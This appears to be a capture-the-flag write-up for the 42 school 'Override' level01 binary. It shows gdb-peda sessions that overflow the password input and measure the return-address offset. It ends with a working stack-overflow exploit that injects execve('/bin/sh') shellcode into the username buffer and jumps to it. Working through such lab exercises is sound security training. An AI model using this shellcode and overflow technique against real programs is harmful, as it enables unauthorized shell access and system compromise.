<pre>
$> gdb ./level01 
gdb-peda$ r < <(python -c "print('dat_wil' + 'A' * 100)"; python -c "print('admin' + 'B' * 500)")
Starting program: /home/alarm/42/Override/level01/Ressources/level01 < <(python -c "print('dat_wil' + 'A' * 100)"; python -c "print('admin' + 'B' * 500)")
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x42424242 ('BBBB')
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7f9d000 --> 0x1e4d6c 
EDI: 0x42424242 ('BBBB')
EBP: 0x42424242 ('BBBB')
ESP: 0xffffd5b0 ('B' <repeats 15 times>)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd5b0 ('B' <repeats 15 times>)
0004| 0xffffd5b4 ('B' <repeats 11 times>)
0008| 0xffffd5b8 ("BBBBBBB")
0012| 0xffffd5bc --> 0x424242 ('BBB')
0016| 0xffffd5c0 --> 0xffffd5f4 --> 0x23f25da8 
0020| 0xffffd5c4 --> 0xf7ffdb40 --> 0xf7ffdae0 --> 0xf7fca3e0 --> 0xf7ffd980 --> 0x0 
0024| 0xffffd5c8 --> 0xf7fca410 --> 0x80482a3 ("GLIBC_2.0")
0028| 0xffffd5cc --> 0xf7f9d000 --> 0x1e4d6c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 
</pre>
<pre>
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r < <(python -c "print('dat_wil' + 'A' * 100)"; python -c "print('admin' + 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL')")
Starting program: /home/alarm/42/Override/level01/Ressources/level01 < <(python -c "print('dat_wil' + 'A' * 100)"; python -c "print('admin' + 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL')")
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x65414149 ('IAAe')
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7f9d000 --> 0x1e4d6c 
EDI: 0x41344141 ('AA4A')
EBP: 0x41414a41 ('AJAA')
ESP: 0xffffd5a0 ("AAKAAgAA6AAL\n")
EIP: 0x35414166 ('fAA5')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x35414166
[------------------------------------stack-------------------------------------]
0000| 0xffffd5a0 ("AAKAAgAA6AAL\n")
0004| 0xffffd5a4 ("AgAA6AAL\n")
0008| 0xffffd5a8 ("6AAL\n")
0012| 0xffffd5ac --> 0xffff000a --> 0x0 
0016| 0xffffd5b0 --> 0xffffd5e4 ("S??AC\201O\004")
0020| 0xffffd5b4 --> 0xf7ffdb40 --> 0xf7ffdae0 --> 0xf7fca3e0 --> 0xf7ffd980 --> 0x0 
0024| 0xffffd5b8 --> 0xf7fca410 --> 0x80482a3 ("GLIBC_2.0")
0028| 0xffffd5bc --> 0xf7f9d000 --> 0x1e4d6c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x35414166 in ?? ()
gdb-peda$ pattern offset fAA5
fAA5 found at offset: 75
<pre>

```
$> (python -c "print('dat_wil0' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 100)"; python -c "print('admin' + 'B' * 75 + '\x48\xa0\x04\x08')"; cat) | ./level01 
```

